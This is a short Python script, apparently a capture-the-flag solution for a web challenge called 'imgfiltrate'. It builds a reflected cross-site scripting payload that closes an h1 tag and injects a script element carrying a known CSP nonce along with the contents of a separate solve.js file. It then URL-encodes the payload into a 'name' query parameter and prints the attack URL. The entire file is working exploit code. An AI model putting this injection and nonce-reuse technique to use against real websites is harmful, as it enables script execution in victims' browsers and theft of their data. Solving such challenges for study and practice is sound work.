import urllib.parse

url = "http://imgfiltrate.hub"
nonce = "70861e83ad7f1863b3020799df93e450"

js = open("solve.js").read()

s = """qxxxb</h1>
<script nonce="{}">
{}
</script>
""".format(
    nonce, js
)

p = urllib.parse.quote(s, safe="")
u = f"{url}/?name={p}"
print(u)
